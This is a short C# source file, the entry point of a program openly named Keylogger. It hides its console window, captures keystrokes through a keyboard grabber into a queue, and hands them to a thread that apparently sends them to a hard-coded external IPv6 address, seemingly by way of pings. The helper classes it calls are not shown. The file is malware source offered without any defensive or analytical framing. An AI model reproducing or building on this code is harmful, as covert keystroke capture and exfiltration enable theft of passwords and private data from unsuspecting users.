using System;
using System.Windows.Forms;
using System.Collections.Concurrent;
using System.Threading;
using System.Net;

namespace Keylogger {
	interface IHandler {
		void handle(BlockingCollection<char> queue);
	}

	class Program {
		public static void Main() {
			Win32API.ShowWindow(Win32API.GetConsoleWindow(), 0);
			
			IHandler handler = new PingAddressTarget(IPAddress.Parse("2001:470:5816:f::"));

			var queue = new BlockingCollection<char>(new ConcurrentQueue<char>());
			using(new KeyboardGrabber(queue)) {
				new Thread(() => handler.handle(queue)).Start();
				Application.Run();
			}
		}
	}
}